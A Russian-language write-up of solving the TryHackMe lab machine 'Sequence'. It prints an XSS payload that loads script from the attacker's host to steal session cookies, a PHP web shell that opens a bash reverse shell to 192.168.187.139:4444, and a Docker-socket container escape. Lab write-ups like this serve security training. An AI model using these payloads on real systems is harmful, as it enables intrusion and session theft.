# Отчет по прохождению машины Sequence (TryHackMe)

## 1. Разведка (Reconnaissance)

Первым этапом было проведено сканирование портов целевой системы с помощью Nmap. Результаты показали открытые порты 22/tcp (SSH) и 80/tcp (Apache). На порту 80 обнаружен веб-сайт, требующий дальнейшего анализа.

## 2. Анализ веб-приложения

### 2.1. Основные эндпоинты

В ходе анализа были обнаружены следующие страницы и директории:

- `/dashboard.php` — защищена авторизацией.
- `/login.php` — форма входа.
- `/contact.php` — форма обратной связи.
- `/db.php` — пустой вывод (содержит пароль от БД в коде).
- `/mail/dump.txt` — письмо с важной информацией о внутренних панелях и паролях.
- `/uploads` — пустая директория.
- `/header.php` — шапка сайта.
- `/phpmyadmin` — доступ запрещён.
- `/settings.php`, `/chat.php` — защищены авторизацией.
- `/logout.php`
- `/new.html` — форма для повышения прав.

### 2.2. Содержимое `/mail/dump.txt`

Письмо содержало критическую информацию:

- Внутренние панели: `/finance.php` и `/lottery.php` находятся во внутренней сети (192.x.x.x).
- Доступ защищён паролем: `S60u}f5j`.
- Упоминание разработчика Robert.

## 3. Эксплуатация (Exploitation)

### 3.1. Получение первой сессии (модератор) через XSS в `contact.php`

В поле `message` формы `contact.php` были отправлены XSS-пейлоады для кражи сессионной cookie. После отправки пейлоада через атрибут `src`:

```html
<script src="http://192.168.187.139:8888/expl.js"></script>
```

На атакующей машине был получен запрос с сессией модератора:

```
10.49.143.67 - - [27/Apr/2026 23:27:38] "GET /steal?c=PHPSESSID=av2a45sbc8ncanv1ev2rb6aov0 HTTP/1.1" 404 -
```

Сессия была успешно украдена. После её подстановки в браузер стал доступен первый флаг.

### 3.2. Попытка XSS в чате (`/chat.php`)

В чате с администратором была попытка внедрить аналогичный пейлоад. Однако результата не было. Причина — фильтрация сообщений на клиентской стороне, включающая запрет на теги `<script>`, события `onerror`, `onload`, а также функции `fetch`, `ajax`, `eval`, `document.cookie` и `window.location`. Обойти фильтр не удалось.

### 3.3. Эскалация до администратора через `admin_view.php`

На странице `/admin_view.php` отображаются все отправленные сообщения, включая XSS-пейлоад из `contact.php`. В чат администратору была отправлена ссылка на эту страницу. При её открытии сработал ранее внедрённый XSS, и на атакующую машину пришла сессия администратора. После подстановки этой сессии стал доступен второй флаг.

### 3.4. Обнаружение скрытой панели `finance.php`

На странице `dashboard.php` (доступной после авторизации) был обнаружен HTML-селект для выбора функции:

```html
<select name="feature" class="form-select" onchange="this.form.submit()">
    <option value="lottery.php" selected>Lottery Feature</option>
</select>
```

Попытка подставить `finance.php` вместо `lottery.php` привела к открытию защищённой панели finance. При вводе пароля из письма (`S60u}f5j`) открылась страница загрузки файлов.

### 3.5. Загрузка веб-шелла

Сначала для проверки возможности загрузки был создан простой текстовый файл `flag.txt`. Загрузка прошла успешно, сервер вернул подтверждение:

```
✅ File uploaded successfully in uploads folder!
File Name: flag.txt
Path: uploads/flag.txt
```

После этого был загружен PHP-файл `shell.php` с содержимым:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.187.139/4444 0>&1'"); ?>
```

Сервер снова подтвердил загрузку:

```
✅ File uploaded successfully in uploads folder!
File Name: shell.php
Path: uploads/shell.php
```

Далее в селекте на странице `dashboard.php` был изменён параметр `feature` с `finance.php` на `uploads/shell.php`. При отправке формы произошло выполнение загруженного PHP-файла. На атакующей машине был запущен слушатель:

```bash
nc -lvnp 4444
```

Пришло соединение. Выполнив команду `id`, я увидел, что нахожусь под пользователем `root`. Проверка файловой системы показала наличие файла `.dockerenv`:

```bash
ls -la /.dockerenv
```

Это подтвердило, что процесс выполняется внутри Docker-контейнера.

### 3.6. Исследование окружения и подготовка к побегу

Внутри контейнера была проверена версия Docker и список образов:

```bash
docker version
docker images
```

Команда `docker images` показала доступные локальные образы:

```
REPOSITORY      TAG       IMAGE ID       CREATED         SIZE
phpvulnerable   latest    d0bf58293d3b   10 months ago   926MB
php             8.1-cli   0ead645a9bc2   13 months ago   527MB
```

Образ `alpine:latest` отсутствовал, интернета для его скачивания не было.

Был проверен сокет Docker:

```bash
ls -la /var/run/docker.sock
srw-rw---- 1 root 121 0 Apr 28 05:23 /var/run/docker.sock
```

Сокет был доступен для записи, что открывало возможность побега на хост.

### 3.7. Побег из контейнера через Docker сокет

Попытка использовать `alpine:latest` не удалась, поэтому был использован локальный образ `phpvulnerable:latest`. Команда для побега:

```bash
docker run -v /:/host -it phpvulnerable:latest chroot /host bash
```

Возникла ошибка `the input device is not a TTY`, связанная с отсутствием интерактивного терминала внутри контейнера. После стабилизации шелла удалось получить оболочку на хостовой системе.

### 3.8. Чтение финального флага

После успешного входа в хост-систему был прочитан флаг root:

```bash
cat /root/root.txt
```

Флаг был получен. Машина полностью пройдена.

## 4. Выводы и достижения

В ходе прохождения машины были успешно применены следующие техники:

- Кража сессии через XSS в форме обратной связи.
- Использование хранимого XSS для повышения привилегий.
- Подстановка параметров через HTML-селект.
- Обнаружение скрытых панелей через анализ кода страницы.
- Загрузка веб-шелла через уязвимую форму загрузки файлов.
- Получение доступа к контейнеру и идентификация окружения через файл `.dockerenv`.
- Побег из контейнера с использованием монтирования Docker сокета и локального образа.
